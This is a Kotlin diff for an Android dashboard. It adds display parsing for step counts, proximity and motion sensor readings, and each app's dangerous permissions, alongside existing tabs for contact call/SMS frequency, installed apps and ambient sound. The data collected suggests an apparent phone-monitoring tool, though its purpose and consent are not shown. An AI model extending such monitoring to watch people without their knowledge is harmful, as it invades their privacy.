@@ -42,6 +42,9 @@ enum class DashboardTab(val label: String, val kind: String?) {
     APPS_LIST("Apps List", "INSTALLED_APPS"),
     CONTACTS("Contacts", "CONTACT_FREQUENCY"),
     AMBIENT("Sound", "AMBIENT_SOUND"),
+    STEPS("Steps", "STEP_COUNT"),
+    SENSORS("Sensors", "SENSOR_DATA"),
+    PERMS("Perms", "APP_PERMISSIONS"),
 }
 
 data class AppUsageEntry(
@@ -308,6 +311,23 @@ class DashboardViewModel @Inject constructor(
                 val calls = obj?.get("callCount")?.jsonPrimitive?.content ?: "0"
                 val sms = obj?.get("smsCount")?.jsonPrimitive?.content ?: "0"
                 ParsedEvent(event, name, "$calls calls, $sms messages (7d)", "contact")
+            }
+            "STEP_COUNT" -> {
+                val steps = obj?.get("steps")?.jsonPrimitive?.content ?: "0"
+                val minutes = obj?.get("periodMinutes")?.jsonPrimitive?.content ?: "0"
+                ParsedEvent(event, "$steps steps", "in ${minutes}min", "steps")
+            }
+            "SENSOR_DATA" -> {
+                val near = obj?.get("proximityNear")?.jsonPrimitive?.content
+                val light = obj?.get("lightLevel")?.jsonPrimitive?.content
+                val moving = obj?.get("isMoving")?.jsonPrimitive?.content == "true"
+                val prox = if (near == "true") "In pocket" else "Open"
+                ParsedEvent(event, "$prox / ${if (moving) "Moving" else "Still"}", "Light: ${light ?: "?"}lx", "sensor")
+            }
+            "APP_PERMISSIONS" -> {
+                val app = obj?.get("appName")?.jsonPrimitive?.content ?: ""
+                val granted = obj?.get("dangerousGranted")?.toString() ?: "[]"
+                ParsedEvent(event, app, "Dangerous: $granted", "permissions")
             }
             else -> ParsedEvent(event, event.kind, event.payload.take(80), "unknown")
         }
